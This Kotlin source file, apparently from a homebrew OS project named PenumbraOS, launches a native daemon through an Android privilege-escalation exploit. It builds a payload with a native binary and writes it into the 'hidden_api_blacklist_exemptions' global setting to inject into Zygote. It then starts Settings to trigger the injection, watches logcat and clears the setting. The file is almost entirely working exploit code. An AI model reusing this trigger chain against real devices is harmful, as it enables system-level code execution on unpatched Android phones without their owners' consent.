package com.penumbraos.pinitd

import android.content.Context
import android.content.Intent
import android.net.Uri
import android.provider.Settings
import android.util.Log
import kotlinx.coroutines.CoroutineScope
import java.io.BufferedReader
import java.io.InputStreamReader
import kotlin.time.Duration.Companion.milliseconds

val EXEMPTIONS_SETTING_URI: Uri = Settings.Global.getUriFor("hidden_api_blacklist_exemptions")

suspend fun launchPinitd(scope: CoroutineScope, context: Context, protection: BootLoopProtection) {
    // Path will end with "base.apk". Remove that and navigate to native library
    val basePath = context.packageCodePath.slice(0..context.packageCodePath.length-9)
    val binaryPath = basePath + "lib/arm64/libpinitd.so"
    Log.w(SHARED_TAG, "Attempting to launch: $binaryPath")
    try {
        // Spawn logcat monitor
        val logcat = Logcat(scope)
        // Make sure logcat is as up to date as possible when we start waiting on it
        logcat.eatInBackground()
        
        // Initialize file watcher
        val fileWatcher = FileWatcher()
        fileWatcher.clearStatus()
        
//        val process = Runtime.getRuntime().exec(arrayOf(binaryPath, "build-payload", "--use-system-domain"))
        val process = Runtime.getRuntime().exec(arrayOf(binaryPath, "build-payload"))

        val reader = BufferedReader(InputStreamReader(process.inputStream))
        var payload = reader.readText()
        reader.close()

        // Fetch settings launch intent prior to actually setting the exploit to improve timing
        val settingsIntent = context.packageManager.getLaunchIntentForPackage("com.android.settings")
        settingsIntent?.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)

        Log.w(SHARED_TAG, "Setting payload: $payload")
        Settings.Global.putString(context.contentResolver, "hidden_api_blacklist_exemptions", payload)

        Log.w(SHARED_TAG, "Payload set")
        startApp("Settings", context, settingsIntent)

        if (logcat.waitForSubstring("com.android.settings/1000 for top-activity {com.android.settings/com.android.settings.Settings", 1000.milliseconds)) {
            Log.w(SHARED_TAG, "Received settings launch log. Sending exemptions clear")
        } else {
            Log.w(SHARED_TAG, "Didn't receive settings launch log. Sending exemptions clear anyway")
        }

        context.contentResolver.delete(EXEMPTIONS_SETTING_URI, null, null)

        Log.w(SHARED_TAG, "Trampoline complete, waiting for pinitd success signal")

        // Wait for pinitd to signal success or failure
        if (fileWatcher.waitForSuccess(30 * 1000)) {
            protection.recordSuccess()
            Log.i(SHARED_TAG, "Boot launch successful")
        } else {
            // Failure already recorded
            Log.w(SHARED_TAG, "Boot launch failed or timed out")
        }

        // TODO: Kill process after delay (to keep `ps` clean)
        Thread.sleep(500)
    } catch (e: Exception) {
        // Failure already recorded
        Log.e(SHARED_TAG, "Exploit error: ${e.message}")
    }
}

fun startApp(name: String, context: Context, intent: Intent?) {
    try {
        if (intent != null) {
            Log.w(SHARED_TAG, "Starting $name")
            context.startActivity(intent)
            Log.w(SHARED_TAG, "Intent sent for $name")
        } else {
            Log.e(SHARED_TAG, "Zygote trigger app not found")
        }
    } catch (e: Exception) {
        Log.e(SHARED_TAG, "Zygote trigger app launch error: ${e.message}")
    }
}